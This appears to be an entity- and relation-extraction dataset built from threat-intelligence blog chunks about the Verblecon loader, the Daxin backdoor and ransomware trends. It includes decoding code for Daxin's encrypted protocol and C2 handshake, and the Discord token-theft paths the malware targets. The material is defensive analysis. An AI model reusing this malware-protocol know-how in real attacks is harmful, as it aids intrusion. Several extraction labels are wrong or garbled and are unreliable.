{"instruction": "What is the goal of this campaign? \nThe evidence found on victim networks appears to indicate that the goal of the attacker was to install cryptocurrency mining software on victim machines. This would appear to be a relatively low-reward goal for the attacker given the level of effort that would have been required to develop this sophisticated malware. \nThere are also indications that the attacker may be stealing Discord tokens and using these to advertise Trojanized videogame applications. \nWe suspect they were stealing Discord tokens because some of the obfuscated strings refer to pathnames that are apparently related to Discord clients, specifically: \n\"AppData\\Roaming\\discordcanary\\Local Storage\\leveldb\" \n\"AppData\\Roaming\\discordptb\\Local Storage\\leveldb\" \n\"Library\\Application Support\\discord\\Local Storage\\leveldb\" \n\"Library\\Application Support\\discordcanary\\Local Storage\\leveldb\" \n\"Library\\Application Support\\discordptb\\Local Storage\\leveldb\" \n\".config\\discordcanary\\Local Storage\\leveldb\" \n\".config\\discordptb\\Local Storage\\leveldb\" \nDiscord is a group chatting app that is particularly popular among the gaming community. Advertising Trojanized videogame applications via Discord is likely a redistribution channel for Trojan.Verblecon.", "input": null, "output": "Named Entities: (cryptocurrency mining software, threat type), (Trojan.Verblecon, malware)\nRelationships:  No related entities and relations."}
{"instruction": "Could this be used to distribute ransomware? \nMost of the infections we saw where this malware was used were on non-enterprise machines; we rarely see ransomware deployed on non-enterprise machines. \nPrevious reports have connected related domains to a single occurrence of ransomware, but the infrastructure may be shared with an unrelated actor. The similarities between that incident and the activity we observed includes: \nThe use of \u201cverble\u201d in the domain name \nThe downloading of shellcode for execution \nSimilar obfuscation \nHowever, we do not have enough evidence to draw a definitive link between both these sets of activity.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related entities and relations."}
{"instruction": "Power in the hands of an inexperienced actor? \nThe activity we have seen carried out using this sophisticated loader indicates that it is being wielded by an individual who may not realize the capabilities of the malware they are using. However, if it fell into the hands of a more sophisticated actor the potential is there for this loader to be used for more serious attacks, including potentially ransomware and espionage campaigns.", "input": null, "output": "Named Entities: (sophisticated loader, tool), (ransomware, threat type), (espionage campaigns, threat type)\nRelationships: (sophisticated loader, used for, ransomware), (sophisticated loader, used for, espionage campaigns)"}
{"instruction": "Daxin Backdoor: In-Depth Analysis, Part Two", "input": null, "output": "Named Entities: (Daxin Backdoor, malware)\nRelationships: No related entities and relations."}
{"instruction": "In the second of a two-part series of blogs, we examine the communications and networking features of Daxin. \nThis is the concluding part of our in-depth analysis of Backdoor. Daxin, advanced malware that is being used by a China-linked espionage group. \nIn this blog, we will analyze the communications and network features of the malware.", "input": null, "output": "Named Entities: (Daxin, malware), (China-linked espionage group, attacker)\nRelationships: (Daxin, used by, China-linked espionage group)"}
{"instruction": "Communications protocol In our previous blog , we set up a lab consisting of four separate networks and five machines. Some of the machines had two network interfaces to communicate with different networks, but all packet forwarding functionality was disabled. Each machine ran various network services that were reachable from its neighbors only. Figure 1. Test setup to illustrate Daxin\u2019s backdoor capabilities. In this section we will dissect the network traffic between two backdoor instances running on the separate computers \u201cAlice-PC\u201d and \u201cBob-PC\u201d. The traffic was initiated by the Daxin backdoor running on \u201cAlice-PC\u201d when it was instructed to create a communication channel to \u201cDave-PC\u201d passing via two intermediate nodes, \u201cBob-PC\u201d and \u201cCharlie-PC\u201d, as described previously.", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "Figure 2. Wireshark capture of traffic between two backdoor instances. The screenshot and examples below are reused from a private report prepared by us that discussed an earlier sample, so certain details may not match. Using Wireshark, we captured traffic between two backdoor instances, one running on \u201cAlice-PC\u201d and the other on \u201cBob-PC\u201d, as shown in Figure 2. Starting with the key exchange, all backdoor communication is carried out by exchanging messages that follow the same underlying format: import struct def dissect_message(message): magic, kind, unknown_03, total_length = struct.unpack(\"<HBBI\", message[: 8]) assert total_length == len(message) print(f\"0000 magic = {magic:04x}\") print(f\"0002 kind = {kind:02x}\") print(f\"0003 unknown_03 = {unknown_03:02x}\") print(f\"0004 total_length = {total_length:08x}\") return magic, kind, message[8: ] The magic value is always 0x9910 or 0x9911.", "input": null, "output": "No related entities and relations."}
{"instruction": "The kind value identifies the state transition during key exchange. Then, once the encrypted communication channel is established, it encodes the purpose of each message and determines the formatting of the data that follows the fixed-size header. The initial message of the key exchange in the Wireshark capture is not encrypted: class Session: pass def decode_key_exchange_1_message(tcp_dump): message = bytes.fromhex(tcp_dump) magic, kind, message_body = dissect_message(message) assert magic == 0x9910 assert kind in [0x10, 0x11] print(f\"0008 message_body (unused) = {message_body}\") return Session() my_session = decode_key_exchange_1_message(\"\"\" 10 99 11 00 08 00 00 00 \"\"\") It can be decoded as follows: 0000 magic = 9910 0002 kind = 11 0003 unknown_03 = 00 0004 total_length = 00000008 0008 message_body (unused) = b''", "input": null, "output": "No related entities and relations."}
{"instruction": "The fields magic and kind correspond to the first three bytes of TCP data, 0x10 0x99 0x11. On the target computer, in case it is infected with a copy of the malicious driver, this sequence causes the TCP connection to be hijacked, as explained in part one of this blog series . The target checks that the received message is valid according to the session state machine, ensuring that magic is the expected constant 0x9910 and kind matches any of two supported values: 0x10 or 0x11. Next, it generates a nonce to use when encrypting any future incoming messages. Finally, it sends a response message with the nonce, its own details, and the information about the infected machine. Parts of the response message are encrypted using a combination of the following algorithms: import hashlib import itertools def rc4_variant(key): \"\"\"Variant of RC4 with modified initial value of j in PRGA.", "input": null, "output": "No related entities and relations."}
{"instruction": "The initial value of j in PRGA is from the final KSA operation and may not be zero. \"\"\" S = bytearray(range(0x100)) j = 0 cycled_key = itertools.cycle(key) for i in range(0x100): j = (j + S[i] + next(cycled_key)) & 0xff S[i], S[j] = S[j], S[i] i = 0 # skipping j reinitialization while True: i = (i + 1) & 0xff j = (j + S[i]) & 0xff S[i], S[j] = S[j], S[i] K = S[(S[i] + S[j]) & 0xff] yield K def rol(value, count, width=8): mask = (1 << width) - 1 return (((value << count) & mask) | ((value & mask) >> (width - count)) ) def xor_crypt(data, key_stream): return bytes([byte ^ next(key_stream) for byte in data]) def derive_key(nonce): md5 = hashlib.md5() md5.update([REDACTED]) md5.update(nonce) rc4_variant_key = bytearray() for byte in md5.digest(): rc4_variant_key.append([REDACTED]) rc4_variant_stream = rc4_variant(rc4_variant_key) return xor_crypt(nonce, rc4_variant_stream) The details of this response message are as follows:", "input": null, "output": "No related entities and relations."}
{"instruction": "from socket import inet_ntoa def decode_key_exchange_2_message(session, tcp_dump): message = bytes.fromhex(tcp_dump) magic, kind, message_body = dissect_message(message) assert magic == 0x9910 assert kind == 0x12 assert 0x114 <= len(message_body) unknown_00 = message_body[: 0x10] session.target_build = int.from_bytes(message_body[0x10: 0x13], \"little\") session.target_version = int.from_bytes(message_body[0x13: 0x14], \"little\") encrypted_target_nonce = message_body[0x14: 0x94] encrypted_information = message_body[0x94: 0xac] unused = message_body[0xac: ] cycled_key = itertools.cycle(b\"\\x10\\x99\") target_nonce = xor_crypt(encrypted_target_nonce, cycled_key) key_stream = rc4_variant(target_nonce) information = xor_crypt(encrypted_information, key_stream) recognised_login = information[: 0x10] initiator_ip_addr = information[0x10: 0x14] netmask = information[0x14: ] print(f\"0008 message_body:\") print(f\"0008 unknown_00 (marker?)= {unknown_00}\") print(f\"0018 target_build? = {session.target_build}\") print(f\"001b target_version? = {session.target_version}\") print(f\"001c target_nonce = {target_nonce.hex()}\") print(f\"009c information:\") print(f\"009c recognised_login = {recognised_login}\") print(f\"00ac initiator_ip_addr = {inet_ntoa(initiator_ip_addr)}\") print(f\"00b0 netmask = {inet_ntoa(netmask)}\") print(f\"00b4 unused = {unused}\") session.target_key = derive_key(target_nonce) session.target_key_stream = itertools.cycle(session.target_key) decode_key_exchange_2_message(my_session, \"\"\" 10 99 12 00 1c 01 00 00 78 72 74 00 83 fa ff ff", "input": null, "output": "No related entities and relations."}
{"instruction": "00 00 00 00 00 00 00 00 75 07 00 13 89 5c 69 be 7f 09 60 ed 3d 3d 9c c5 ef 55 67 29 14 67 70 2d ef a7 5e bb 5f 59 a4 e8 31 d4 55 cf f4 7e 19 15 ed 29 a1 48 ac 91 38 a8 9f 6f 7a 1f 66 50 89 d9 a7 66 5e fb c3 fc 3d 54 a8 19 ac 58 28 b5 65 38 aa 1a 09 6f 20 99 58 2e 59 7d 5f 51 f7 40 51 59 c3 4f 59 76 a0 db 2e 39 3d c5 68 02 6f 43 f2 77 1f 49 41 74 7f 4d 04 e1 83 f9 dd e5 2e e1 6f 25 aa 15 f7 4b dc 06 00 e9 f7 30 32 75 82 7b 14 87", "input": null, "output": "No related entities and relations."}
{"instruction": "cb 40 2b 42 8e 54 5a dd c4 21 d2 b7 8f 88 25 02 95 e0 4d 4e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \"\"\") The message includes the backdoor login that is recognized during the following key exchange step, and what looks like malware build and version numbers.", "input": null, "output": "No related entities and relations."}
{"instruction": "Looking at the decoded message, we find references to \u201cXRT\u201d and these reassemble the hardcoded Name \u201cNDISXRPT\u201d that we documented when discussing the NdisRegisterProtocol() call during driver initialization: 0000 magic = 9910 0002 kind = 12 0003 unknown_03 = 00 0004 total_length = 0000011c 0008 message_body: 0008 unknown_00 (marker?) = b'xrt\\x00\\x83\\xfa\\xff\\xff[REMOVED ZEROS]' 0018 target_build? = 1909 001b target_version? = 19 001c target_nonce = 99c57927[REMOVED FOR BREVITY]e7a922ec 009c information: 009c recognised_login = b'XRT[REMOVED ZEROS]' 00ac initiator_ip_addr = 10.0.2.1 00b0 netmask = 255.255.255.0 00b4 unused = b'[REMOVED ZEROS]' The initiator responds with the backdoor login and hashed password: def decode_key_exchange_3_message(session, tcp_dump): encrypted_message = bytes.fromhex(tcp_dump) message = xor_crypt(encrypted_message, session.target_key_stream) magic, kind, message_body = dissect_message(message) assert magic == 0x9911 assert kind == 0x15 assert 0x94 <= len(message_body) login = message_body[: 0x10] password_hash = message_body[0x10: 0x14] initiator_nonce = message_body[0x14: 0x94] unused = message_body[0x94: ] print(f\"0008 message_body:\") print(f\"0008 login = {login}\") print(f\"0018 password_hash = {password_hash.hex()}\")", "input": null, "output": "No related entities and relations."}
{"instruction": "print(f\"001c initiator_nonce = {initiator_nonce.hex()}\") print(f\"009c unused = {unused}\") session.initiator_key = derive_key(initiator_nonce) session.initiator_key_stream = itertools.cycle(session.initiator_key) md5 = hashlib.md5() md5.update([REDACTED]) md5.update(session.target_key[: 0x40]) md5.update(session.initiator_key[0x40: ]) if (session.target_build > 1410) and (session.target_version >= 16): md5.update([REDACTED]) session.shared_key = md5.digest() decode_key_exchange_3_message(my_session, \"\"\" 26 dc d1 0c 6e d9 52 76 e4 7d 56 33 36 a7 a1 46 76 74 37 80 5f f5 89 69 xx xx xx xx 98 9f 16 9a 11 73 23 01 56 70 bd 13 fb a8 b6 8c bf 04 ae b1 dc b8 22 44 da 1b bb c0 59 87 c3 0f 55 66 89 ae 14 84 70 89 7d 6e a0 28 3e ff 8e 7c da 99 a7 00 ad 1b c7 63 72 60 c7 4a 09 df 4c fb d8 b2 da 56 b4 de 71 3b 7e a5 c0 d4 28 bd 55 5c 2c 23 42 51", "input": null, "output": "No related entities and relations."}
{"instruction": "76 0f ad 5d 8e eb c6 f9 05 38 81 42 07 c6 5c 5f a0 22 94 b0 9f f0 2e 6d 5f 7e ab d4 fa 55 4d a8 ff 0a 09 d3 d7 cf ad f3 74 fb 88 48 \"\"\") It also includes its own nonce, like this: 0000 magic = 9911 0002 kind = 15 0003 unknown_03 = 00 0004 total_length = 0000009c 0008 message_body: 0008 login = b'XRT[REMOVED ZEROS]' 0018 password_hash = [REDACTED] 001c initiator_nonce = b0bf1c98[REMOVED FOR BREVITY]0bee8fff 009c unused = b'' At this point, the peers exchange their nonces and compute two transport keys. Each transport key is used in stream mode to encrypt the TCP half-stream directed towards the side that generated the corresponding nonce.", "input": null, "output": "No related entities and relations."}
{"instruction": "The peers also combined their nonces into the shared key. This shared key will be used to encrypt the body of each exchanged message, reusing the same key every time. The final key exchange message confirms that the initiator was successfully authenticated and the backdoor is ready to process instructions: def dissect_encrypted_message(transport_key_stream, shared_key, encrypted_message): message = xor_crypt(encrypted_message, transport_key_stream) magic, kind, encrypted_message_body = dissect_message(message) key_stream = rc4_variant(shared_key) message_body = xor_crypt(encrypted_message_body, key_stream) return magic, kind, message_body def decode_key_exchange_4_message(session, tcp_dump): encrypted_message = bytes.fromhex(tcp_dump) magic, kind, message_body = dissect_encrypted_message(session.initiator_key_stream, session.shared_key, encrypted_message) assert magic == 0x9911 assert kind == 0x16 print(f\"0008 message_body (unused) = {message_body}\") decode_key_exchange_4_message(my_session, \"\"\" 44 4a 18 ce 90 a5 67 2f \"\"\") It can be decoded as follows: 0000 magic = 9911 0002 kind = 16 0003 unknown_03 = 00 0004 total_length = 00000008 0008 message_body (unused) = b''", "input": null, "output": "No related entities and relations."}
{"instruction": "For the messages that follow, the kind field encodes the message purpose. This determines the formatting of the message body. For example, the backdoor instruction to set up new connectivity across multiple malicious nodes uses kind value 6 with the following message body structure: def format_kind_06_message_body(message_body): number_of_nodes = int.from_bytes(message_body[: 2], \"little\") remaining_to_connect = int.from_bytes(message_body[2: 4], \"little\") print(f\"0008 message_body:\") print(f\"0008 number_of_nodes = {number_of_nodes}\") print(f\"000a remaining_to_connect = {remaining_to_connect}\") offset = 4 for index in range(number_of_nodes): ip_addr = message_body[offset: offset + 4][:: -1] port = int.from_bytes(message_body[offset + 4: offset + 6], \"little\") login = message_body[offset + 6: offset + 0x16] password = message_body[offset + 0x16: offset + 0x38] comment = \"\" if index + remaining_to_connect == number_of_nodes: comment = \" (HEAD)\" print(f\"{offset + 0x08:04x} node #{index + 1}{comment}:\") print(f\"{offset + 0x08:04x} ip_addr = {inet_ntoa(ip_addr)}\") print(f\"{offset + 0x0c:04x} port = {port}\") print(f\"{offset + 0x0e:04x} login = {login}\") print(f\"{offset + 0x1e:04x} password = {password}\")", "input": null, "output": "No related entities and relations."}
{"instruction": "offset += 0x38 unused = message_body[offset: ] print(f\"{offset + 0x08:04x} unused = {unused}\") We could continue to decrypt all the backdoor communication that follows: message_body_formatters = { 0x06: format_kind_06_message_body, } def format_message_body(message_body): print(f\"0008 message_body = {message_body}\") def decode_encrypted_initiator_message(session, tcp_dump): encrypted_message = bytes.fromhex(tcp_dump) magic, kind, message_body = dissect_encrypted_message(session.target_key_stream, session.shared_key, encrypted_message) message_body_formatters.get(kind, format_message_body)(message_body) def decode_encrypted_target_message(session, tcp_dump): encrypted_message = bytes.fromhex(tcp_dump) magic, kind, message_body = dissect_encrypted_message(session.initiator_key_stream, session.shared_key, encrypted_message) message_body_formatters.get(kind, format_message_body)(message_body) For example, the next message in the captured network traffic is: decode_encrypted_initiator_message(my_session, \"\"\" 39 b9 0c 02 7b f8 d1 a4 b7 a3 8f 4b 15 f4 33 33 a2 be aa 75 14 46 8f 25 62 7b fa 22 01 24 6a ee 36 c0 xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx", "input": null, "output": "No related entities and relations."}
{"instruction": "xx xx xx xx d0 77 c6 16 35 bd 3a 39 6d df 9a 8b cb de 6a a0 8d e7 f4 e7 e6 ae xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx 72 fc a0 2a cd 21 04 57 41 e8 17 68 0a f4 de 18 6a 80 99 39 f7 b6 xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx \"\"\") This instructs the backdoor to set up remaining connectivity across malicious nodes as explained in the \u201cBackdoor capabilities\u201d section in our previous blog: 0000 magic = 9911 0002 kind = 06", "input": null, "output": "No related entities and relations."}
{"instruction": "0003 unknown_03 = 00 0004 total_length = 000000b4 0008 message_body: 0008 number_of_nodes = 3 000a remaining_to_connect = 2 000c node #1: 000c ip_addr = 10.0.2.2 0010 port = 80 0012 login = b'XRT[REMOVED ZEROS]' 0022 password = b'[REDACTED]' 0044 node #2 (HEAD): 0044 ip_addr = 10.0.3.3 0048 port = 80 004a login = b'XRT[REMOVED ZEROS]' 005a password = b'[REDACTED]' 007c node #3: 007c ip_addr = 10.0.4.4 0080 port = 80 0082 login = b'XRT[REMOVED ZEROS]' 0092 password = b'[REDACTED]' 00b4 unused = b'' The most interesting observation about encryption is that Daxin supports two methods for computing the shared key during the key exchange. To select which of the two methods to use, the initiator examines the target message, comparing what looks like build and version numbers against certain hardcoded constants. This could be in order to facilitate upgrading the malicious network in the field without disruption.", "input": null, "output": "Named Entities: (Daxin, malware), (10.0.2.2, IP), (10.0.3.3, IP), (10.0.4.4, IP)\nRelationships: (Daxin, connect to, 10.0.2.2), (Daxin, connect to, 10.0.3.3), (Daxin, connect to, 10.0.4.4)"}
{"instruction": "Additionally, the current key exchange implementation involves additional obfuscation that is not present in some older samples. It is possible that the attacker was forced to change the algorithm and decided to implement additional measures to protect the details of new logic. An alternative explanation is that different teams within the attacker organization were sharing the same codebase, where one of these teams implemented the alternative key exchange method and related obfuscations to mitigate against potential compromise due to the other team\u2019s activity, while still sharing some of the communication infrastructure.", "input": null, "output": "No related entities and relations."}
{"instruction": "External communication The communications protocol documented in the previous section is how two backdoor instances communicate with each other. On top of that, the analyzed sample also supports two additional communication methods. These additional methods are well suited for crossing the perimeter of the target organization. HTTP One of these additional communication methods uses HTTP messages to encapsulate backdoor communications. To demonstrate this, we implemented our own client to interact with the backdoor using this method. Our client communicated with the backdoor instance running on \u201cAlice-PC\u201d over HTTP to control a set of infected machines, as discussed in the previous two sections.", "input": null, "output": "No related entities and relations."}
{"instruction": "On the target computer, in case it is infected with a copy of Daxin, the first HTTP request causes the TCP connection to be hijacked due to the malicious packet filter triggering on the HTTP \u201cPOST\u201d method string with URI substring \u201c756981520337\u201d as explained in the \u201cNetworking\u201d section of our previous blog. Daxin then parses HTTP request headers and extracts the request body. The request body is then interpreted using the same logic as already described in the \u201cCommunications protocol\u201d section. The reverse communication is then encapsulated as the HTTP response body. When generating the HTTP response, the malicious driver includes \u201cSID\u201d cookie. The value of \u201cSID\u201d cookie is then used when constructing the URI for the subsequent HTTP request. \u201cHOST\u201d connectivity", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: (No related entities and relations."}
{"instruction": "The malicious driver can also be configured to communicate with a remote TCP server for command and control. It then periodically connects to the remote server, performs a handshake that is unique to this connectivity method, and then starts backdoor communication. This connectivity method is controlled with persistent configuration that can be updated by the remote attacker, as explained in the \u201cBackdoor capabilities\u201d section of our previous blog. To obtain the details of the TCP server to connect to, Daxin checks the value of the \u201cHOST\u201d configuration item. In case the value starts with \u201chttp://\u201d, the TCP server details are retrieved from the remote web server, as described below. Otherwise, the configuration value is interpreted as the TCP server address and port.", "input": null, "output": "No related entities and relations."}
{"instruction": "In order to retrieve the TCP server details from the remote web server, the analyzed sample contacts the provided URL and scans the received HTTP response, including HTTP headers, for magic strings. Whenever it finds \u201cf8xD4C01\u201d followed later by \u201cd7C6x12B\u201d, it attempts to interpret any data immediately following the first marker as a hexadecimal string. The data obtained by decoding the hexadecimal string is then decrypted using the following algorithm: def decrypt(data): return bytes([((byte - 0x7d) & 0xff) ^ 0x49 for byte in data]) The decrypted data are interpreted as the TCP server address and port to use. Whenever the analyzed sample connects to the TCP server, it sends the following sequence of bytes as its handshake: def serialize_client_handshake(tags_value): magic = b\"\\xA8\\xB0\\x13\\x7C\\x00\\x2C\\x13\\xBA\" build = 1909 return magic + struct.pack(\"<HH\", build, len(tags_value)) + tags_value", "input": null, "output": "No related entities and relations."}
{"instruction": "The tags_value parameter is the value of the \u201cTAGS\u201d configuration item. We suspect that the remote server uses the tags_value for tracking specific infections. The analyzed sample then expects to receive the following hardcoded sequence of bytes from the remote server: def serialize_server_handshake(): return b\"\\xA8\\xB0\\x13\\x7C\\x45\\x1B\\xAC\\xC0\" This should be followed by the usual key exchange as described in the \u201cCommunication protocol\u201d section, where the remote server acts as initiator.", "input": null, "output": "No related entities and relations."}
{"instruction": "Conclusion \nThis concludes the second and final part of our technical analysis of Backdoor.Daxin. \nSymantec Enterprise Blogs You might also enjoy \n9 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "Daxin: Stealthy Backdoor Designed for Attacks Against Hardened Networks Espionage tool is the most advanced piece of malware Symantec researchers have seen from China-linked actors. \nSymantec Enterprise Blogs You might also enjoy \n14 Min Read", "input": null, "output": "Named Entities: (Daxin, malware), (Espionage tool, tool), (China-linked actors, attacker)\nRelationships: (Daxin, most advanced, Espionage tool)"}
{"instruction": "Daxin Backdoor: In-Depth Analysis, Part One In the first of a two-part series of blogs, we will delve deeper into Daxin, examining the driver initialization, networking, key exchange, and backdoor functionality of the malware.", "input": null, "output": "Named Entities: (Daxin Backdoor, malware)\nRelationships: No related entities and relations."}
{"instruction": "The Ransomware Threat Landscape: What to Expect in 2022", "input": null, "output": "No related entities and relations."}
{"instruction": "Targeted ransomware continues to grow as TTPs evolve and new threat actors emerge \nRansomware continued to be the most significant cyber threat facing enterprises during 2021. While ransomware gangs are currently experiencing a period of turmoil and disruption, there is no guarantee that the threat posed by ransomware will abate in 2022, since similar disruptions in the past were usually followed by the emergence of new threats. \nAccording to a new whitepaper published by the Symantec Threat Hunter team, part of Broadcom Software , targeted ransomware attacks continued to trend upwards in 2021, almost trebling between the first and final quarters of the year.", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related entities and relations."}
{"instruction": "New Threats \nOne of the main developments during 2021 was the disappearance of established threat actors and the emergence of new groups to take their place. Of the major ransomware threats operating at the beginning of 2021, only Conti continued to remain active at year end. \nDuring 2021, a number of high-profile ransomware operations disappeared. These included Leafroller (aka Sodinokibi, REvil), Coreid (Darkside and Blackmatter), and Avaddon. \nHowever, a number of new actors have emerged to take their place. LockBit expanded rapidly following the departure of some of its rivals, while several new threats such as Pinion (Hive) and Sirex (AvosLocker) became quite active. \nSymantec Enterprise Blogs White Paper", "input": null, "output": "Named Entities: (Conti, attacker), (Leafroller, attacker), (Sodinokibi, attacker), (REvil, attacker), (Coreid, attacker), (Darkside, attacker), (Blackmatter, attacker), (Avaddon, attacker), (LockBit, attacker), (Pinion, attacker), (Hive, attacker), (Sirex, attacker), (AvosLocker, attacker)\n\nRelationships: (Leafroller, aka, Sodinokibi), (Leafroller, aka, Sodinokibi), (Coreid, aka, Darkside), (Coreid, aka, Blackmatter), (Pinion, aka, Hive), (Sirex, aka, AvosLocker)"}
{"instruction": "The Ransomware Threat Landscape: What to Expect in 2022 Download Now \nDownload Now", "input": null, "output": "No related entities and relations."}
{"instruction": "Evolving TTPs One of the key trends noted in this research is the constantly evolving set of tools, tactics, and procedures (TTPS) employed by ransomware attackers. New TTPs emerge regularly as attackers bid to stay one step ahead of network defenders. Ransomware groups these days now employ quite a diverse toolset, making use of a mixture custom malware, legitimate software, and operating system features (also known as living off the land). Table 1. Top ten TTPs seen in ransomware investigations, April \u2013 December 2021 \ufeffTTP Percentage PsExec 34% Cobalt Strike 18% Mimikatz 11% VssAdmin 10% NetScan 7% BITSAdmin 4% AdFind 5% Nsudo 5% PowerShell 5% MSIExec 4% WEIRDLOOP 3%", "input": null, "output": "Named Entities: (ransomware, threat type)\nRelationships: No related entities and relations."}
{"instruction": "This diverse toolset is evident in the ten most frequently employed TTPs Symantec\u2019s Threat Hunter Team found in ransomware investigations. The most frequently used tool, PsExec, is a Windows operating system feature that is often abused by attackers for executing processes on other systems. The next most frequently used tool was Cobalt Strike, which is off-the-shelf malware ostensibly sold as a penetration testing tool but is most frequently seen being used for malicious purposes. New TTPs seen during the latter half of 2021 include abuse of VssAdmin, a legitimate Windows process that can be used to manage or delete shadow copies on Windows machines; along with abuse of MSIExec, a legitimate Windows installer that can be used by attackers to load malicious payloads onto targeted machines. This was just a sample of the content in our latest whitepaper. Read the full paper for more insights into the ransomware threat landscape.", "input": null, "output": "Named Entities: (ransomware, threat type), (PsExec, tool), (Cobalt Strike, tool), (VssAdmin, tool), (MSIExec, tool)\nRelationships: (ransomware, used tool, PsExec), (ransomware, used tool, Cobalt Strike), (ransomware, used tool, VssAdmin), (ransomware, used tool, MSIExec)"}
{"instruction": "Daxin: Stealthy Backdoor Designed for Attacks Against Hardened Networks Espionage tool is the most advanced piece of malware Symantec researchers have seen from China-linked actors. \nSymantec Enterprise Blogs You might also enjoy \n4 Min Read", "input": null, "output": "Named Entities: (Daxin, malware), (Espionage tool, tool)\nRelationships: (Daxin, designed for, Espionage tool)"}
{"instruction": "Ukraine: Disk-wiping Attacks Precede Russian Invasion Destructive malware deployed against targets in Ukraine and other countries in the region in the hours prior to invasion.", "input": null, "output": "No related entities and relations."}
{"instruction": "Daxin Backdoor: In-Depth Analysis, Part One", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "In the first of a two-part series of blogs, we will delve deeper into Daxin, examining the driver initialization, networking, key exchange, and backdoor functionality of the malware. Following on from our earlier blog detailing the discovery of Backdoor.Daxin, Symantec\u2019s Threat Hunter Team, part of Broadcom Software, would like to provide further technical details on this threat. Used by a China-linked espionage group, Daxin exhibits technical sophistication previously unseen by such actors. In particular, it implements communications features that appear to have been designed for deep penetration of highly-secured networks. The focus of this blog series is to document how these features were implemented. Daxin comes in the form of a Windows kernel driver. In this blog, we will detail the driver initialization, networking, key exchange, and backdoor functionality. In our next blog, the second of two, we will examine the communications and network features of the malware.", "input": null, "output": "Named Entities: (Daxin, malware), (Backdoor.Daxin, malware),(China-linked espionage group, attacker), (Windows kernel driver, tool)\nRelationships: (Daxin, used by, China-linked espionage group), (Daxin, form, Windows kernel driver)"}
{"instruction": "Our analysis is based on a Backdoor.Daxin sample (SHA256: ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef). The forensic evidence collected by us indicates that this sample had been deployed in November 2021 against two separate organizations. The described Daxin features are contained in many earlier Daxin variants unless stated otherwise. The recent changes to the driver codebase are to support more recent Windows versions and fix certain bugs.", "input": null, "output": "Named Entities: (Backdoor.Daxin, malware), ( ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef, SHA256)\nRelationships: (Backdoor.Daxin, hash, ea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef)"}
{"instruction": "Driver initialization The Daxin sample analyzed appears to be packed with a standard VMProtect packer. Many earlier samples feature an additional, outside, packing layer on top of VMProtect. That outside packer was custom-made for the driver and even reused the same customized encryption algorithm used in the final payload. We believe that the attackers decided to remove that custom packer due to compatibility issues with recent Windows releases. Whenever the driver is started, the code added by the packer decrypts and decompresses the final payload, and then passes control to the entry point of the decompressed payload. At this point, the malicious code is visible in kernel memory, albeit with some obfuscations. The bulk of the payload initialization code is involved with the network stack of the Windows kernel. This includes identification of some non-exported structures and hooking of the Windows TCP/IP stack.", "input": null, "output": "Named Entities: (Daxin, malware), (VMProtect, tool)\nRelationships: (Daxin, packed with, VMProtect)"}
{"instruction": "Daxin hooks the Network Driver Interface Specification (NDIS) layer by modifying every pre-existing NDIS_OPEN_BLOCK for the TCP/IP protocol, where the ReceiveNetBufferLists and ProtSendNetBufferListsComplete handlers are replaced with its own. For each of these NDIS_OPEN_BLOCKs , the related NDIS_M_DRIVER_BLOCK may also be modified by replacing any existing SendNetBufferListsHandler . When the SendNetBufferListsHandler is not present, the corresponding NDIS_MINIPORT_BLOCK is modified by replacing NextSendNetBufferListsHandler .", "input": null, "output": "Named Entities: (Daxin, malware)\nRelationships: No related entities and relations."}
{"instruction": "To identify all NDIS_OPEN_BLOCKs for the TCP/IP protocol, the driver relies on calling NdisRegisterProtocol() to create and return a new head of non-exported ndisProtocolList . Then it walks ndisProtocolList of every NDIS_PROTOCOL_BLOCK comparing the Name attribute of each visited NDIS_PROTOCOL_BLOCK structure with the string \u201cTCPIP\u201d. The OpenQueue field of the matching structure points to the list of NDIS_OPEN_BLOCKs to hook. This basic technique is known and documented , but Daxin hooks a slightly different set of handlers. We believe that these adjustments are not exclusive to Daxin and are driven by architectural changes in Windows Network Architecture.", "input": null, "output": "No related entities and relations."}
{"instruction": "In order to identify the related NDIS_M_DRIVER_BLOCKs and NDIS_MINIPORT_BLOCKs , the driver analyses \u201cndis.sys\u201d machine code to locate non-exported ndisFindMiniportOnGlobalList() and ndisMiniDriverList . The relevant NDIS_MINIPORT_BLOCKs are then obtained starting with the previously identified NDIS_OPEN_BLOCKs , where the RootDeviceName of each instance is passed as a parameter for the ndisFindMiniportOnGlobalList() call that returns the structure to hook. Finally, to locate related NDIS_M_DRIVER_BLOCKs , the driver walks ndisMiniDriverList checking the MiniportQueue list of each item for the already identified NDIS_MINIPORT_BLOCKs . Details of the hooking process demonstrated in this blog were captured in the lab using a virtual machine with a kernel debugger attached. When registering the fake protocol, Daxin calls the NdisRegisterProtocol() API passing a ProtocolCharacteristics argument with the hardcoded Name attribute \u201cNDISXRPT\u201d. Figure 1. Hardcoded name and obfuscated NdisRegisterProtocol() call.", "input": null, "output": "Named Entities: (ndis.sys, file), (Daxin, malware)\n\nRelationships: (ndis.sys, analyzed by, Daxin)"}
